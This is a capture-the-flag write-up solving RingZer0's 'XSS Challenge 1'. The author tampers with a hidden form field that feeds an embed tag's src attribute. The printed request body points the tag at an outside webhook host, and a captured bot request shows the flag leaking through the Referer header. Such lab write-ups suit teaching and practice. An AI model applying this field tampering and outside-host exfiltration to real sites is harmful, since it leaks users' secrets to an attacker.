# XSS Challenge 1 Solutions

The first payload I tried with is 
```
abcd"<'
```
and viewing the page source for the response is the following:
```html

<!DOCTYPE html>
<html>
	<head>
		<title>RingZer0 Team Online CTF Challenge</title>
		<link rel="stylesheet" type="text/css" href="/css/main.css">
	</head>
	<body>
		<header></header>
		<div class="padding"><img src="/imgs/logo.png" /></div>
		<section>
    <br />
    <br />
    Generate random image using base64 string.<br /><br />
    <form action="" method="post">
      base64 string<br />
      <input type="hidden" name="type" value="data:image/png;base64" />
      <textarea name="img"></textarea><br />
      <input type="submit" value="submit" />
    </form>
    <br /><embed src="data:image/png;base64,abcd&quot;&lt;&#039;" /><br /><br />
  </section>
  <div class="pre_footer"></div>
  <footer>RingZer0 Team 2022</footer>
	</body>
</html>
```

Essentially, this is how my payload was reflected in the document:
```html
<br /><embed src="data:image/png;base64,abcd&quot;&lt;&#039;" /><br /><br />
```
So looks like `data:image/png;base64,` was appended with my payload (with everything escaped).

Another interesting thing from the page source is the following hidden form input, which seems to be what my payload was appended to:
```html
<input type="hidden" name="type" value="data:image/png;base64" />
```

To test this theory, from the developer tools, I changed the `value` attribute of the hidden field to `blah` (or could've used Burp) and submitted another comment. I got an embeded frame with the following content:
```
<!DOCTYPE html PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at challenges.ringzer0team.com Port 10096</address>

</body></html>
```

Also, looking at the page source from the response:
```html

<!DOCTYPE html>
<html>
	<head>
		<title>RingZer0 Team Online CTF Challenge</title>
		<link rel="stylesheet" type="text/css" href="/css/main.css">
	</head>
	<body>
		<header></header>
		<div class="padding"><img src="/imgs/logo.png" /></div>
		<section>
			<br />
      <br />
      Generate random image using base64 string.<br /><br />
      <form action="" method="post">
        base64 string<br />
        <input type="hidden" name="type" value="data:image/png;base64" />
        <textarea name="img"></textarea><br />
        <input type="submit" value="submit" />
      </form>
      <br /><embed src="blah,abcd&quot;&lt;&#039;" /><br /><br />
		</section>
		<div class="pre_footer"></div>
    <footer>RingZer0 Team 2022</footer>
	</body>
</html>
```

and this is how the payload was reflected:
```html
<br /><embed src="blah,abcd&quot;&lt;&#039;" /><br /><br />
```
So looks like what gets reflected on the page is:
```
the value of the hidden field + "," + escaped contents of the comment, reflected in the "src" attribute of an "embed" tag.
```
The next thing I tried was entering my webhook listener url with an `#` at the end to comment out the "," that gets appened to it as the `value` attribute of the hidden form input, and submited an empty comment.
Essentially, my request looked something like:

```
type=http%3A%2F%2Fmywebhooklistener.com%23&img= 
```
Parsed, it looks like:
```
type: http://mywebhooklistener.com#
img: 
```
I received the following request from the XSS Bot:
```
GET / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://127.0.0.1/xss1/bot_endpoint_4s7k718yYC.php?FLAG-[CENSORED]
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en,*
Host: mywebhooklistener.com
```

Voilà! :) 